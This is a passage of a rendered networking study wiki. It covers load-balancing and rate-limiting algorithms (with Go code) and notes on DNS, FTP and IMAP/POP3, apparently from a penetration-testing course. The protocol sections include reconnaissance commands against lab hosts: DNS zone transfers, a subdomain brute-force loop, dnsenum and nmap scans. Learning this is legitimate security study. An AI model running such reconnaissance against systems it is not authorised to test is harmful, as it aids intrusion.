52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
#
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="load-balancing"><a class="header" href="#load-balancing">Load Balancing</a></h1>
<h2 id="directory-map-19"><a class="header" href="#directory-map-19">Directory Map</a></h2>
<ul>
<li><a href="#load-balancing-1">load-balancing</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="load-balancing-1"><a class="header" href="#load-balancing-1">load balancing</a></h1>
<p><img src="networking/load-balancing/lb-algorithms.png" alt=""></p>
<h2 id="static-algorithms"><a class="header" href="#static-algorithms">Static Algorithms</a></h2>
<h3 id="round-robin"><a class="header" href="#round-robin">Round Robin</a></h3>
<ul>
<li>The client requests are sent to different service instances in sequential order. The services are usually required to be stateless.</li>
</ul>
<h3 id="sticky-round-robin"><a class="header" href="#sticky-round-robin">Sticky Round Robin</a></h3>
<ul>
<li>This is an improvement of the round-robin algorithm. If Alice‚Äôs first request goes to service A, the following requests go to service A as well.</li>
</ul>
<h3 id="weighted-round-robin"><a class="header" href="#weighted-round-robin">Weighted round-robin</a></h3>
<ul>
<li>The admin can specify the weight for each service. The ones with a higher weight handle more requests than others.</li>
</ul>
<h3 id="hash"><a class="header" href="#hash">Hash</a></h3>
<ul>
<li>This algorithm applies a hash function on the incoming requests‚Äô IP or URL. The requests are routed to relevant instances based on the hash function result. We can use other attributes for hashing algorithms. For example, HTTP header, request type, client type, etc.</li>
</ul>
<h2 id="dynamic-algorithms"><a class="header" href="#dynamic-algorithms">Dynamic Algorithms</a></h2>
<h3 id="least-connections"><a class="header" href="#least-connections">Least connections</a></h3>
<ul>
<li>A new request is sent to the service instance with the least concurrent connections.</li>
</ul>
<h3 id="least-response-time"><a class="header" href="#least-response-time">Least response time</a></h3>
<ul>
<li>A new request is sent to the service instance with the fastest response time.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="nginx"><a class="header" href="#nginx">Nginx</a></h1>
<h2 id="directory-map-20"><a class="header" href="#directory-map-20">Directory Map</a></h2>
<ul>
<li><a href="#set-header">custom-header-response</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="set-header"><a href="#set-header" class="header">set header</a></h1>
<pre><code>    nginx.ingress.kubernetes.io/server-snippet: |
        if ($upstream_status == 404){
            #set header
            add_header x-aprimo-upstream-status "my server header content!";
        }
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="rate-limiting-algorithms"><a class="header" href="#rate-limiting-algorithms">Rate Limiting Algorithms</a></h1>
<h2 id="directory-map-21"><a class="header" href="#directory-map-21">Directory Map</a></h2>
<ul>
<li><a href="#fixed-window-counter-algorithm">fixed-window-counter</a></li>
<li><a href="#leaking-bucket-algorithm">leaking-bucket</a></li>
<li><a href="#token-bucket-algorithm">token-bucket</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="fixed-window-counter-algorithm"><a class="header" href="#fixed-window-counter-algorithm">Fixed Window Counter Algorithm</a></h1>
<p>The algorithm divides a timeline into fixed-size windows and assign a counter to each window. Each request increments the counter by 1. Once the counter reaches the pre-defined threshold, future requests are dropped until a new time window starts.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="leaking-bucket-algorithm"><a class="header" href="#leaking-bucket-algorithm">Leaking Bucket Algorithm</a></h1>
<p>Similar to a token bucket except that requests are processed at a fixed rate. It is usually implemented with a queue (FIFO).</p>
<p>When a request arrives, the system checks if the queue is full. If it is not full, the request is added to the queue. Otherwise, the request is dropped. Requests are pulled from the queue and processed at regular intervals.</p>
<p>Leaking Bucket algorithm takes two parameters; Bucket size (usually equal to the queue size) and Outflow rate (how many requests can be processed per second).</p>
<pre><code class="language-go">package main

import (
	"sync"
	"time"
)

type LeakyBucket struct {
	capacity    int64
	remaining   int64
	leakRate    time.Duration
	lastLeak    time.Time
	mu          sync.Mutex
}

func NewLeakyBucket(capacity int64, leakRate time.Duration) *LeakyBucket {
	return &amp;LeakyBucket{
		capacity:  capacity,
		remaining: capacity,
		leakRate:  leakRate,
		lastLeak:  time.Now(),
	}
}

func (b *LeakyBucket) TryTake(n int64) bool {
	b.mu.Lock()
	defer b.mu.Unlock()

	// Calculate the time since the last leak
	now := time.Now()
	leaked := int64(now.Sub(b.lastLeak) / b.leakRate)

	// Update the bucket's current state
	if leaked &gt; 0 {
		if leaked &gt;= b.remaining {
			b.remaining = b.capacity
		} else {
			b.remaining += leaked
		}
		b.lastLeak = now
	}

	// Try to take n from the bucket
	if n &gt; b.remaining {
		return false
	}
	b.remaining -= n
	return true
}

func main() {
	bucket := NewLeakyBucket(10, time.Second)
	for {
		if bucket.TryTake(1) {
			println("Took 1 from the bucket")
		} else {
			println("Bucket is empty, waiting...")
		}
		time.Sleep(100 * time.Millisecond)
	}
}

</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="token-bucket-algorithm"><a class="header" href="#token-bucket-algorithm">TOKEN BUCKET ALGORITHM</a></h1>
<p>The token bucket rate limiting algorithm is a popular method for rate limiting, used by companies like Amazon and Stripe.</p>
<p>A token bucket is a container that has a pre-defined capacity. Tokens are put in the bucket at preset rates periodically. Once the bucket is full, no more tokens are added. Each request consumes one token. When a request arrives, we first check if there are available tokens in the bucket. If there are no tokens available, the request is denied.</p>
<p>The token bucket algorithm takes two parameters. Bucket size (the number of tokens the bucket can store) and refill rate (number of tokens put into the bucket every second).</p>
<h3 id="example-4"><a class="header" href="#example-4">Example:</a></h3>
<pre><code class="language-go">package main

import (
	"fmt"
	"sync"
	"time"
)

// TokenBucket represents a token bucket rate limiter
type TokenBucket struct {
	tokens           int
	capacity         int
	tokenRate        time.Duration
	lastRefill       time.Time
	mu               sync.Mutex
}

// NewTokenBucket creates a new token bucket
func NewTokenBucket(capacity int, refillRate time.Duration) *TokenBucket {
	return &amp;TokenBucket{
		tokens:           capacity,
		capacity:         capacity,
		tokenRate:        refillRate,
		lastRefill:       time.Now(),
	}
}

// refill refills tokens in the bucket based on the elapsed time since the last refill
func (tb *TokenBucket) refill() {
	now := time.Now()
	elapsed := now.Sub(tb.lastRefill)
	tokensToAdd := int(elapsed / tb.tokenRate)
	if tokensToAdd &gt; 0 {
		tb.tokens = min(tb.capacity, tb.tokens+tokensToAdd)
		tb.lastRefill = now
	}
}

// Consume consumes a token from the bucket if available
func (tb *TokenBucket) Consume() bool {
	tb.mu.Lock()
	defer tb.mu.Unlock()

	tb.refill()
	if tb.tokens &gt; 0 {
		tb.tokens--
		return true
	}
	return false
}

func min(a, b int) int {
	if a &lt; b {
		return a
	}
	return b
}

func main() {
	tb := NewTokenBucket(10, time.Second)  // Capacity of 10 tokens, and refills 1 token every second

	// Simulating rapid requests
	for i := 0; i &lt; 15; i++ {
		if tb.Consume() {
			fmt.Println("Request", i, "allowed")
		} else {
			fmt.Println("Request", i, "denied")
		}
		time.Sleep(500 * time.Millisecond)
	}
}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="protocols-1"><a class="header" href="#protocols-1">Protocols</a></h1>
<h2 id="directory-map-22"><a class="header" href="#directory-map-22">Directory Map</a></h2>
<ul>
<li><a href="#dns-2">dns</a></li>
<li><a href="#ftp">ftp</a></li>
<li><a href="#icmp">icmp</a></li>
<li><a href="#imap--pop3">imap/pop3</a></li>
<li><a href="#mqtt">mqtt</a></li>
<li><a href="#nfs-network-file-system">nfs</a></li>
<li><a href="#ntp">ntp</a></li>
<li><a href="#quic">quic</a></li>
<li><a href="#server-message-block-smb">smb</a></li>
<li><a href="#smtp-simple-mail-transfer-protocol">smtp</a></li>
<li><a href="#snmp">snmp</a></li>
<li><a href="#ssh">ssh</a></li>
<li><a href="#tls">tls</a></li>
<li><a href="#udp-1">udp</a></li>
<li><a href="networking/protocols/websocket.html">websocket</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="dns-2"><a class="header" href="#dns-2">DNS</a></h1>
<p>Domain Name System (DNS) is an integral part of the Internet that resolves computer names into IP addresses. DNS is a distributed system without a central database, functioning like a library with many different phone books. The information is distributed over many thousands of name servers globally. DNS servers translate domain names into IP addresses and control which server a user can reach via a particular domain. DNS also stores additional information about services associated with a domain, such as mail servers and name servers.</p>
<h2 id="dns-server-types"><a class="header" href="#dns-server-types">DNS Server Types</a></h2>
<ul>
<li><strong>DNS Root Server</strong>: Responsible for top-level domains (TLD). There are 13 root servers globally, coordinated by ICANN. They serve as the central interface between users and content on the Internet.</li>
<li><strong>Authoritative Nameserver</strong>: Holds authority for a particular zone and only answers queries from their area of responsibility. Their information is binding.</li>
<li><strong>Non-authoritative Nameserver</strong>: Not responsible for a particular DNS zone. They collect information on specific DNS zones using recursive or iterative DNS querying.</li>
<li><strong>Caching DNS Server</strong>: Caches information from other name servers for a specified period determined by the authoritative name server.</li>
<li><strong>Forwarding Server</strong>: Performs only one function: forwards DNS queries to another DNS server.</li>
<li><strong>Resolver</strong>: Not an authoritative DNS server but performs name resolution locally in the computer or router.</li>
</ul>
<h2 id="dns-encryption"><a class="header" href="#dns-encryption">DNS Encryption</a></h2>
<p>DNS is mainly unencrypted, which means devices on the local WLAN and Internet providers can intercept and spy on DNS queries. This poses a privacy risk. Solutions for DNS encryption include:</p>
<ul>
<li><strong>DNS over TLS (DoT)</strong>: Encrypts DNS traffic using TLS</li>
<li><strong>DNS over HTTPS (DoH)</strong>: Encrypts DNS traffic using HTTPS</li>
<li><strong>DNSCrypt</strong>: A network protocol that encrypts traffic between the computer and the name server</li>
</ul>
<h2 id="dns-records"><a class="header" href="#dns-records">DNS Records</a></h2>
<p>Different DNS records are used for DNS queries, each serving various tasks:</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Record</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td>A</td><td>Returns an IPv4 address of the requested domain</td></tr>
<tr><td>AAAA</td><td>Returns an IPv6 address of the requested domain</td></tr>
<tr><td>MX</td><td>Returns the responsible mail servers</td></tr>
<tr><td>NS</td><td>Returns the DNS servers (nameservers) of the domain</td></tr>
<tr><td>TXT</td><td>Contains various information (e.g., Google Search Console validation, SSL certificate validation, SPF and DMARC entries for mail traffic)</td></tr>
<tr><td>PTR</td><td>Used for reverse translation of IP addresses into names</td></tr>
<tr><td>CNAME</td><td>Creates an alias from one domain name to another</td></tr>
<tr><td>SOA</td><td>Start of Authority record containing administrative information about the zone</td></tr>
</tbody>
</table>
</div>
<h2 id="domain-hierarchy"><a class="header" href="#domain-hierarchy">Domain Hierarchy</a></h2>
<p>The DNS hierarchy consists of:</p>
<ul>
<li><strong>Root</strong>: The top level of the DNS hierarchy</li>
<li><strong>Top Level Domains (TLD)</strong>: Examples include <code>.net</code>, <code>.org</code>, <code>.com</code>, <code>.dev</code>, <code>.io</code></li>
<li><strong>Second Level Domain</strong>: Example: <code>inlanefreight.com</code></li>
<li><strong>Sub-Domains</strong>: Examples: <code>dev.inlanefreight.com</code>, <code>www.inlanefreight.com</code>, <code>mail.inlanefreight.com</code></li>
<li><strong>Host</strong>: Example: <code>WS01.dev.inlanefreight.com</code></li>
</ul>
<h2 id="zone-files"><a class="header" href="#zone-files">Zone Files</a></h2>
<p>Zone files contain forward records in BIND format, allowing the DNS server to identify which domain, hostname, and role IP addresses belong to. This is essentially the phone book where the DNS server looks up addresses for domains.</p>
<p>Example forward zone file:</p>
<pre><code class="language-bash">root@bind9:~# cat /etc/bind/db.domain.com

;
; BIND reverse data file for local loopback interface
;
$ORIGIN domain.com
$TTL 86400
@     IN     SOA    dns1.domain.com.     hostmaster.domain.com. (
                    2001062501 ; serial
                    21600      ; refresh after 6 hours
                    3600       ; retry after 1 hour
                    604800     ; expire after 1 week
                    86400 )    ; minimum TTL of 1 day

      IN     NS     ns1.domain.com.
      IN     NS     ns2.domain.com.

      IN     MX     10     mx.domain.com.
      IN     MX     20     mx2.domain.com.

             IN     A       10.129.14.5

server1      IN     A       10.129.14.5
server2      IN     A       10.129.14.7
ns1          IN     A       10.129.14.2
ns2          IN     A       10.129.14.3

ftp          IN     CNAME   server1
mx           IN     CNAME   server1
mx2          IN     CNAME   server2
www          IN     CNAME   server2
</code></pre>
<h2 id="reverse-name-resolution"><a class="header" href="#reverse-name-resolution">Reverse Name Resolution</a></h2>
<p>For Fully Qualified Domain Name (FQDN) to be resolved from an IP address, the DNS server must have a reverse lookup file. PTR records are responsible for the reverse translation of IP addresses into names. In this file, the computer name (FQDN) is assigned to the last octet of an IP address using a PTR record.</p>
<p>Example reverse zone file:</p>
<pre><code class="language-bash">root@bind9:~# cat /etc/bind/db.10.129.14

;
; BIND reverse data file for local loopback interface
;
$ORIGIN 14.129.10.in-addr.arpa
$TTL 86400
@     IN     SOA    dns1.domain.com.     hostmaster.domain.com. (
                    2001062501 ; serial
                    21600      ; refresh after 6 hours
                    3600       ; retry after 1 hour
                    604800     ; expire after 1 week
                    86400 )    ; minimum TTL of 1 day

      IN     NS     ns1.domain.com.
      IN     NS     ns2.domain.com.

5    IN     PTR    server1.domain.com.
7    IN     MX     mx.domain.com.
</code></pre>
<h2 id="zone-transfers"><a class="header" href="#zone-transfers">Zone Transfers</a></h2>
<p>In practice, additional servers called secondary name servers are installed for redundancy. For some Top-Level Domains (TLDs), making zone files accessible on at least two servers is mandatory. DNS entries are generally only created, modified, or deleted on the primary server. A DNS server that serves as a direct source for synchronizing a zone file is called a master. A DNS server that obtains zone data from a master is called a slave. The slave fetches the SOA record of the relevant zone from the master at certain intervals (refresh time, usually one hour) and compares serial numbers.</p>
<h2 id="dangerous-settings"><a class="header" href="#dangerous-settings">Dangerous Settings</a></h2>
<p>DNS servers can be vulnerable to attacks. Some dangerous settings that can lead to vulnerabilities include:</p>
<ul>
<li><strong>allow-query</strong>: Defines which hosts are allowed to send requests to the DNS server</li>
<li><strong>allow-recursion</strong>: Defines which hosts are allowed to send recursive requests to the DNS server</li>
<li><strong>allow-transfer</strong>: Defines which hosts are allowed to receive zone transfers from the DNS server. If set to <code>any</code> or a broad subnet, anyone can query the entire zone file, potentially exposing internal IP addresses and hostnames</li>
<li><strong>zone-statistics</strong>: Collects statistical data of zones</li>
</ul>
<h2 id="footprinting-dns-services"><a class="header" href="#footprinting-dns-services">Footprinting DNS Services</a></h2>
<h3 id="querying-name-servers"><a class="header" href="#querying-name-servers">Querying Name Servers</a></h3>
<p>DNS servers can be queried to discover which other name servers are known using the NS record:</p>
<pre><code class="language-bash">rnemeth@htb[/htb]$ dig ns inlanefreight.htb @10.129.14.128
</code></pre>
<h3 id="zone-transfer-axfr"><a class="header" href="#zone-transfer-axfr">Zone Transfer (AXFR)</a></h3>
<p>Zone transfers can reveal all DNS records for a domain. If <code>allow-transfer</code> is misconfigured, an attacker can retrieve the entire zone file:</p>
<pre><code class="language-bash">rnemeth@htb[/htb]$ dig axfr inlanefreight.htb @10.129.14.128

; &lt;&lt;&gt;&gt; DiG 9.16.1-Ubuntu &lt;&lt;&gt;&gt; axfr inlanefreight.htb @10.129.14.128
;; global options: +cmd
inlanefreight.htb.      604800  IN      SOA     inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
inlanefreight.htb.      604800  IN      TXT     "MS=ms97310371"
inlanefreight.htb.      604800  IN      TXT     "atlassian-domain-verification=t1rKCy68JFszSdCKVpw64A1QksWdXuYFUeSXKU"
inlanefreight.htb.      604800  IN      TXT     "v=spf1 include:mailgun.org include:_spf.google.com include:spf.protection.outlook.com include:_spf.atlassian.net ip4:10.129.124.8 ip4:10.129.127.2 ip4:10.129.42.106 ~all"
inlanefreight.htb.      604800  IN      NS      ns.inlanefreight.htb.
app.inlanefreight.htb.  604800  IN      A       10.129.18.15
internal.inlanefreight.htb. 604800 IN   A       10.129.1.6
mail1.inlanefreight.htb. 604800 IN      A       10.129.18.201
ns.inlanefreight.htb.   604800  IN      A       10.129.34.136
</code></pre>
<h3 id="subdomain-brute-forcing"><a class="header" href="#subdomain-brute-forcing">Subdomain Brute Forcing</a></h3>
<p>Individual A records with hostnames can be discovered through brute-force attacks using wordlists (such as those from SecLists):</p>
<pre><code class="language-bash">rnemeth@htb[/htb]$ for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done

ns.inlanefreight.htb.   604800  IN      A       10.129.34.136
mail1.inlanefreight.htb. 604800 IN      A       10.129.18.201
app.inlanefreight.htb.  604800  IN      A       10.129.18.15
</code></pre>
<p>Tools like <code>dnsenum</code> can automate this process:</p>
<pre><code class="language-bash">rnemeth@htb[/htb]$ dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="ftp"><a class="header" href="#ftp">FTP</a></h1>
<p>FTP is a layer 7 application protocol and is one of the oldest protocols used on the internet. It is used for transferring files between a client and a server over a TCP/IP network. FTP operates on two separate channels: a command channel for sending commands and a data channel for transferring files.</p>
<h1 id="how-ftp-works"><a class="header" href="#how-ftp-works">How FTP Works</a></h1>
<ul>
<li>FTP uses a client-server architecture, where the client initiates a connection to the server. The client sends commands to the server over the command channel, and the server responds with status codes and messages. When a file transfer is initiated, a separate data channel is established for transferring the file.</li>
<li>FTP supports two modes of operation: active and passive. In active mode, the client opens a random port and sends the port number to the server, which then connects back to the client on that port for data transfer. In passive mode, the server opens a random port and sends the port number to the client, which then connects to the server on that port for data transfer. Passive mode is often used when the client is behind a firewall or NAT.</li>
<li>FTP uses tcp/21 for control (commands) and tcp/20 for data transfer in active mode. In passive mode, the data port is dynamically assigned by the server.</li>
<li>The FTP protocol supports a number of commands. However, not all implementations support all commands. With each command sent by the client, the server will respond with a status code (similar to HTTP). The status codes can be viewed here: https://en.wikipedia.org/wiki/List_of_FTP_server_return_codes</li>
<li>FTP transmits data in plaintext, which means that all data, including usernames and passwords, are sent unencrypted. This makes FTP vulnerable to eavesdropping.</li>
</ul>
<h2 id="login"><a class="header" href="#login">Login</a></h2>
<ul>
<li>Upon connecting the FTP server, we will be prompted to provide a username and password (assuming anonymous auth is disabled). After providing the correct username/password combination, the FTP server will respond with a status code 230, along with the banner of the server (if one exists).</li>
</ul>
<pre><code class="language-bash">ftp&gt; user rtn
331 Please specify the password.
Password:
230 Login successful.
</code></pre>
<ul>
<li>After authenticating, one of the first things we can do is check the status of the server:</li>
</ul>
<pre><code class="language-bash">ftp&gt; status

Connected to 10.129.14.136.
No proxy connection.
Connecting using address family: any.
Mode: stream; Type: binary; Form: non-print; Structure: file
Verbose: on; Bell: off; Prompting: on; Globbing: on
Store unique: off; Receive unique: off
Case: off; CR stripping: on
Quote control characters: on
Ntrans: off
Nmap: off
Hash mark printing: off; Use of PORT cmds: on
Tick counter printing: off
</code></pre>
<h1 id="vsftpd"><a class="header" href="#vsftpd">vsFTPd</a></h1>
<ul>
<li>vsFTPd (Very Secure FTP Daemon) is a popular open-source FTP server for Unix-like systems. It is known for its security features and performance. vsFTPd supports both active and passive modes of FTP and provides various configuration options to enhance security, such as SSL/TLS encryption, user authentication, and access control.</li>
<li>The default configuration for vsFTPd can typically be found at <code>/etc/vsftpd.conf</code></li>
<li><code>/etc/ftpusers</code> is a file that contains a list of users who are not allowed to log in to the FTP server. If a username is listed in this file, the user will be denied access to the FTP server, regardless of their password or other authentication methods.</li>
</ul>
<pre><code class="language-bash">rtn@ns1:~$ cat /etc/ftpusers
# /etc/ftpusers: list of users disallowed FTP access. See ftpusers(5).

root
daemon
bin
sys
sync
games
man
lp
mail
news
uucp
nobody
</code></pre>
<h1 id="footprinting-ftp-services"><a class="header" href="#footprinting-ftp-services">Footprinting FTP Services</a></h1>
<p><code>nmap</code> is an excellent tool for footprinting remote FTP servers. We can use its built-in scripting engine (and ready-made scripts) to help interrogate a potential FTP service.</p>
<ul>
<li>First, we‚Äôll want to update the <code>nmap</code> scripting database:</li>
</ul>
<pre><code class="language-bash">rnemeth@htb[/htb]$ sudo nmap --script-updatedb

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 13:49 CEST
NSE: Updating rule database.
NSE: Script Database updated successfully.
Nmap done: 0 IP addresses (0 hosts up) scanned in 0.28 seconds
</code></pre>
<ul>
<li><code>nmap</code> scripts are typically located in <code>/usr/share/nmap/scripts/</code></li>
<li>Example run of <code>nmap</code> against an FTP server:</li>
</ul>
<pre><code class="language-bash">rnemeth@htb[/htb]$ sudo nmap -sV -p21 -sC -A 10.129.14.136

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-16 18:12 CEST
Nmap scan report for 10.129.14.136
Host is up (0.00013s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rwxrwxrwx    1 ftp      ftp       8138592 Sep 16 17:24 Calendar.pptx [NSE: writeable]
| drwxrwxrwx    4 ftp      ftp          4096 Sep 16 17:57 Clients [NSE: writeable]
| drwxrwxrwx    2 ftp      ftp          4096 Sep 16 18:05 Documents [NSE: writeable]
| drwxrwxrwx    2 ftp      ftp          4096 Sep 16 17:24 Employees [NSE: writeable]
| -rwxrwxrwx    1 ftp      ftp            41 Sep 16 17:24 Important Notes.txt [NSE: writeable]
|_-rwxrwxrwx    1 ftp      ftp             0 Sep 15 14:57 testupload.txt [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.4
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="icmp"><a class="header" href="#icmp">ICMP</a></h1>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="imap--pop3"><a class="header" href="#imap--pop3">IMAP / POP3</a></h1>
<p>With the help of the Internet Message Access Protocol (IMAP), access to emails from a mail server is possible. Unlike the Post Office Protocol (POP3), IMAP allows online management of emails directly on the server and supports folder structures. Thus, it is a network protocol for the online management of emails on a remote server. The protocol is client-server-based and allows synchronization of a local email client with the mailbox on the server, providing a kind of network file system for emails, allowing problem-free synchronization across several independent clients. POP3, on the other hand, does not have the same functionality as IMAP, and it only provides listing, retrieving, and deleting emails as functions at the email server. Therefore, protocols such as IMAP must be used for additional functionalities such as hierarchical mailboxes directly at the mail server, access to multiple mailboxes during a session, and preselection of emails.</p>
<h2 id="how-imap-works"><a class="header" href="#how-imap-works">How IMAP Works</a></h2>
<ul>
<li>Clients access these structures online and can create local copies. Even across several clients, this results in a uniform database. Emails remain on the server until they are deleted.</li>
<li>IMAP is text-based and has extended functions, such as browsing emails directly on the server. It is also possible for several users to access the email server simultaneously.</li>
<li>Without an active connection to the server, managing emails is impossible. However, some clients offer an offline mode with a local copy of the mailbox. The client synchronizes all offline local changes when a connection is reestablished.</li>
<li>The client establishes the connection to the server via port 143. For communication, it uses text-based commands in ASCII format. Several commands can be sent in succession without waiting for confirmation from the server. Later confirmations from the server can be assigned to the individual commands using the identifiers sent along with the commands.</li>
<li>Immediately after the connection is established, the user is authenticated by user name and password to the server. Access to the desired mailbox is only possible after successful authentication.</li>
<li>SMTP is usually used to send emails. By copying sent emails into an IMAP folder, all clients have access to all sent mails, regardless of the computer from which they were sent.</li>
<li>Another advantage of the Internet Message Access Protocol is creating personal folders and folder structures in the mailbox. This feature makes the mailbox clearer and easier to manage. However, the storage space requirement on the email server increases.</li>
</ul>
<h2 id="security-1"><a class="header" href="#security-1">Security</a></h2>
<ul>
<li>Without further measures, IMAP works unencrypted and transmits commands, emails, or usernames and passwords in plain text. Many email servers require establishing an encrypted IMAP session to ensure greater security in email traffic and prevent unauthorized access to mailboxes.</li>
<li>SSL/TLS is usually used for this purpose. Depending on the method and implementation used, the encrypted connection uses the standard port 143 or an alternative port such as 993.</li>
</ul>
<h2 id="default-configuration"><a class="header" href="#default-configuration">Default Configuration</a></h2>
<p>Both IMAP and POP3 have a large number of configuration options, making it difficult to deep dive into each component in more detail. If you wish to examine these protocol configurations deeper, we recommend creating a VM locally and install the two packages <code>dovecot-imapd</code>, and <code>dovecot-pop3d</code> using apt and play around with the configurations and experiment.</p>
<p>In the documentation of Dovecot, we can find the individual core settings and service configuration options that can be utilized for our experiments. However, let us look at the list of commands and see how we can directly interact and communicate with IMAP and POP3 using the command line.</p>
<h2 id="imap-commands"><a class="header" href="#imap-commands">IMAP Commands</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Command</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td>LOGIN username password</td><td>User‚Äôs login.</td></tr>
<tr><td>LIST ‚Äú‚Äù *</td><td>Lists all directories.</td></tr>
<tr><td>CREATE ‚ÄúINBOX‚Äù</td><td>Creates a mailbox with a specified name.</td></tr>
<tr><td>DELETE ‚ÄúINBOX‚Äù</td><td>Deletes a mailbox.</td></tr>
<tr><td>RENAME ‚ÄúToRead‚Äù ‚ÄúImportant‚Äù</td><td>Renames a mailbox.</td></tr>
<tr><td>LSUB ‚Äú‚Äù *</td><td>Returns a subset of names from the set of names that the User has declared as being active or subscribed.</td></tr>
<tr><td>SELECT INBOX</td><td>Selects a mailbox so that messages in the mailbox can be accessed.</td></tr>
<tr><td>UNSELECT INBOX</td><td>Exits the selected mailbox.</td></tr>
<tr><td>FETCH <id> all</id></td><td>Retrieves data associated with a message in the mailbox.</td></tr>
<tr><td>CLOSE</td><td>Removes all messages with the Deleted flag set.</td></tr>
<tr><td>LOGOUT</td><td>Closes the connection with the IMAP server.</td></tr>
</tbody>
</table>
</div>
<h2 id="pop3-commands"><a class="header" href="#pop3-commands">POP3 Commands</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Command</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td>USER username</td><td>Identifies the user.</td></tr>
<tr><td>PASS password</td><td>Authentication of the user using its password.</td></tr>
<tr><td>STAT</td><td>Requests the number of saved emails from the server.</td></tr>
<tr><td>LIST</td><td>Requests from the server the number and size of all emails.</td></tr>
<tr><td>RETR id</td><td>Requests the server to deliver the requested email by ID.</td></tr>
<tr><td>DELE id</td><td>Requests the server to delete the requested email by ID.</td></tr>
<tr><td>CAPA</td><td>Requests the server to display the server capabilities.</td></tr>
<tr><td>RSET</td><td>Requests the server to reset the transmitted information.</td></tr>
<tr><td>QUIT</td><td>Closes the connection with the POP3 server.</td></tr>
</tbody>
</table>
</div>
<h2 id="dangerous-settings-1"><a class="header" href="#dangerous-settings-1">Dangerous Settings</a></h2>
<p>Nevertheless, configuration options that were improperly configured could allow us to obtain more information, such as debugging the executed commands on the service or logging in as anonymous, similar to the FTP service. Most companies use third-party email providers such as Google, Microsoft, and many others. However, some companies still use their own mail servers for many different reasons. One of these reasons is to maintain the privacy that they want to keep in their own hands. Many configuration mistakes can be made by administrators, which in the worst cases will allow us to read all the emails sent and received, which may even contain confidential or sensitive information. Some of these configuration options include:</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Setting</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td>auth_debug</td><td>Enables all authentication debug logging.</td></tr>
<tr><td>auth_debug_passwords</td><td>This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged.</td></tr>
<tr><td>auth_verbose</td><td>Logs unsuccessful authentication attempts and their reasons.</td></tr>
<tr><td>auth_verbose_passwords</td><td>Passwords used for authentication are logged and can also be truncated.</td></tr>
<tr><td>auth_anonymous_username</td><td>This specifies the username to be used when logging in with the ANONYMOUS SASL mechanism.</td></tr>
</tbody>
</table>
</div>
<h2 id="footprinting-the-service"><a class="header" href="#footprinting-the-service">Footprinting the Service</a></h2>
<p>By default, ports 110 and 995 are used for POP3, and ports 143 and 993 are used for IMAP. The higher ports (993 and 995) use TLS/SSL to encrypt the communication between the client and server. Using Nmap, we can scan the server for these ports. The scan will return the corresponding information (as seen below) if the server uses an embedded certificate.</p>
<h3 id="nmap"><a class="header" href="#nmap">Nmap</a></h3>
<pre><code class="language-bash">rnemeth@htb[/htb]$ sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-19 22:09 CEST
Nmap scan report for 10.129.14.128
Host is up (0.00026s latency).

PORT    STATE SERVICE  VERSION
110/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE SASL STLS TOP UIDL RESP-CODES CAPA PIPELINING
| ssl-cert: Subject: commonName=mail1.inlanefreight.htb/organizationName=Inlanefreight/stateOrProvinceName=California/countryName=US
| Not valid before: 2021-09-19T19:44:58
|_Not valid after:  2295-07-04T19:44:58
143/tcp open  imap     Dovecot imapd
|_imap-capabilities: more have post-login STARTTLS Pre-login capabilities LITERAL+ LOGIN-REFERRALS OK LOGINDISABLEDA0001 SASL-IR ENABLE listed IDLE ID IMAP4rev1
| ssl-cert: Subject: commonName=mail1.inlanefreight.htb/organizationName=Inlanefreight/stateOrProvinceName=California/countryName=US
| Not valid before: 2021-09-19T19:44:58
|_Not valid after:  2295-07-04T19:44:58
993/tcp open  ssl/imap Dovecot imapd
|_imap-capabilities: more have post-login OK capabilities LITERAL+ LOGIN-REFERRALS Pre-login AUTH=PLAINA0001 SASL-IR ENABLE listed IDLE ID IMAP4rev1
| ssl-cert: Subject: commonName=mail1.inlanefreight.htb/organizationName=Inlanefreight/stateOrProvinceName=California/countryName=US
| Not valid before: 2021-09-19T19:44:58
